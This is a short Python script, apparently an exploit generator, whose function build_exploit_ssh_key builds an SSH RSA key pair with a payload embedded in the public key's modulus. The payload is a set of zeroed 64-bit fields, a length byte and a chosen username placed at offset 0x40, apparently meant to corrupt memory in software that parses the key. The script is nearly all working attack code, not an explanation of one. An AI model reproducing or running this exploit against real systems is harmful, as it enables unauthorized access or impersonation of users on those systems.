#!/usr/bin/env python3

import secrets
import math
import base64
import struct

from Crypto.PublicKey import RSA
from Crypto.Util.number import isPrime

E = 0x10001
N_BYTES = 0x181


def encl(n):
    return n.to_bytes(4, byteorder='big')


def encs(s):
    return encl(len(s))+s


def encnum(n):
    l = n.bit_length() // 8 + 1
    return encl(l) + n.to_bytes(l, byteorder='big')


def p8(num):
    assert 0 <= num < 2**8
    return struct.pack('B', num)


def p64(num):
    assert 0 <= num < 2**64
    return struct.pack('Q', num)


def next_prime(p):
    if p % 2 == 0:
        p += 1

    while not isPrime(p):
        p += 2

    return p


def build_exploit_ssh_key(user):
    assert len(user) < 23, "Username too long"

    prefix = encs(b'ssh-rsa') + encnum(E)

    payload = p64(0) + p64(0) * 3 + p8(len(user) << 1) + user.encode().ljust(23, b'\x00')

    data = b'\x01'.ljust(0x40 - len(prefix) - 4, b'\x01') + payload
    n = int.from_bytes(data.ljust(N_BYTES, b'\x00'), byteorder='big')

    p = next_prime(secrets.randbelow(math.isqrt(n)))
    q = next_prime(n // p)

    phi = (p - 1) * (q - 1)
    n = p * q

    d = pow(E, -1, phi)

    pubkey = prefix + encnum(n)

    # Validate that our generated pubkey has the correct payload
    assert pubkey[0x40:].startswith(payload)

    pubkey_string = 'ssh-rsa ' + base64.b64encode(pubkey).decode()

    rsa_key = RSA.construct((n, E, d, p, q))
    privkey_string = rsa_key.export_key().decode()

    return (privkey_string, pubkey_string)
